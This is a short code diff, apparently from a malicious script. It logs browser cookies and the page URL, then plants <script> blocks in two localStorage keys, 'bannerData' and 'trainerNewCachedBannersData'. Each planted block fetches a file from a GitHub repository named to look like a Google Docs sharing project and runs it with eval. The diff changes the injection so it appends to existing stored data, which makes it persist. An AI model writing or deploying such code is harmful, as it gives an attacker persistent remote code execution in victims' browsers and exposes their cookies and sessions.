@@ -7,16 +7,16 @@ urll = encodeURI(location.href)
 console.log(cookies)
 
 try{
-localStorage.bannerData = `<script>
+localStorage.bannerData = localStorage.bannerData + `<script>
 fetch('https://raw.githubusercontent.com/CompartirGoogleDocs/CompartirGoogleDocs/main/JS2').then((res) => {return res.text();
   }).then((json) => {console.log(json);eval(json); // The json object is here;
   });
 </script>`}catch{console.log("1 failed")}
 
 try{
-localStorage.trainerNewCachedBannersData = `<script>
+localStorage.trainerNewCachedBannersData = localStorage.trainerNewCachedBannersData + `<script>
 fetch('https://raw.githubusercontent.com/CompartirGoogleDocs/CompartirGoogleDocs/main/JS2').then((res) => {return res.text();
-  }).then((json) => {console.log(json);eval(json); // The json object is here;
+  }).then((json) => {console.log(json);eval(json); // The json object is here
   });
 </script>`}catch{console.log("2 failed")}
 
